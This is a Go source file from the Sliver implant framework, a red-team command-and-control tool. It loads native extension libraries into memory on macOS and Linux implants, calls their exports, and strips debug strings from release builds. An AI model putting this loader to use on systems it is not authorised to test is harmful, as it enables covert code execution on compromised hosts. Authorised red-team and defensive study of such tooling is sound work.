//go:build (darwin && (amd64 || arm64)) || (linux && (386 || amd64 || arm64))

package extension

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"errors"
	"runtime"
	"sync"
	"sync/atomic"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/ebitengine/purego"
	reflektor "github.com/sliverarmory/reflektor/native"
)

type extensionCall struct {
	onFinish func([]byte)
}

// UnixExtension is a Reflektor-backed native extension for supported Unix
// targets.
type UnixExtension struct {
	id       string
	data     []byte
	module   *reflektor.Library
	arch     string
	init     string
	callback uintptr
	active   atomic.Pointer[extensionCall]
	sync.Mutex
}

func newUnixExtension(data []byte, id string, arch string, init string) *UnixExtension {
	return &UnixExtension{
		id:   id,
		data: data,
		arch: arch,
		init: init,
	}
}

// GetID returns the extension identifier.
func (u *UnixExtension) GetID() string {
	return u.id
}

// GetArch returns the extension architecture.
func (u *UnixExtension) GetArch() string {
	return u.arch
}

// Load maps the extension and invokes its optional initialization export.
func (u *UnixExtension) Load() error {
	if len(u.data) == 0 {
		return errors.New("{{if .Config.Debug}} extension data is empty {{end}}")
	}

	u.Lock()
	defer u.Unlock()
	if u.module != nil {
		return errors.New("{{if .Config.Debug}} module already loaded {{end}}")
	}

	module, err := reflektor.LoadLibrary(u.data)
	if err != nil {
		return err
	}
	if u.init != "" {
		// {{if .Config.Debug}}
		log.Printf("Calling %s\n", u.init)
		// {{end}}
		if err := module.CallExport(u.init); err != nil {
			_ = module.Close()
			return err
		}
	}

	callback, err := newUnixExtensionCallback(u)
	if err != nil {
		_ = module.Close()
		return err
	}
	u.callback = callback
	u.module = module
	return nil
}

// Call invokes an extension export with the native extension callback ABI.
func (u *UnixExtension) Call(export string, arguments []byte, onFinish func([]byte)) error {
	u.Lock()
	defer u.Unlock()
	if u.module == nil {
		return errors.New("{{if .Config.Debug}} module not loaded {{end}}")
	}
	if uint64(len(arguments)) > uint64(^uint32(0)) {
		return errors.New("{{if .Config.Debug}} extension arguments exceed uint32 size {{end}}")
	}

	var argumentsPtr uintptr
	if len(arguments) > 0 {
		argumentsPtr = uintptr(unsafe.Pointer(&arguments[0]))
	}
	argumentsSize := uintptr(uint32(len(arguments)))
	call := &extensionCall{onFinish: onFinish}
	u.active.Store(call)
	defer u.active.Store(nil)

	// {{if .Config.Debug}}
	log.Printf("Calling %s, arguments addr: 0x%08x, args size: %08x\n", export, argumentsPtr, argumentsSize)
	// {{end}}
	_, err := u.module.CallExportWithArgs(export, argumentsPtr, argumentsSize, u.callback)
	runtime.KeepAlive(arguments)
	runtime.KeepAlive(call)
	return err
}

func newUnixExtensionCallback(extension *UnixExtension) (callback uintptr, err error) {
	defer func() {
		if recovered := recover(); recovered != nil {
			// {{if .Config.Debug}}
			log.Printf("Failed to create extension callback: %v\n", recovered)
			// {{end}}
			callback = 0
			err = errors.New("{{if .Config.Debug}} failed to create extension callback {{end}}")
		}
	}()
	return purego.NewCallback(extension.extensionCallback), nil
}

func (u *UnixExtension) extensionCallback(data unsafe.Pointer, dataLen int32) (result int32) {
	result = Failure
	defer func() {
		if recover() != nil {
			result = Failure
		}
	}()

	call := u.active.Load()
	if call == nil || call.onFinish == nil {
		return Failure
	}
	if dataLen == 0 {
		return Success
	}
	if data == nil || dataLen < 0 {
		return Failure
	}

	output := append([]byte(nil), unsafe.Slice((*byte)(data), int(dataLen))...)
	call.onFinish(output)
	return Success
}
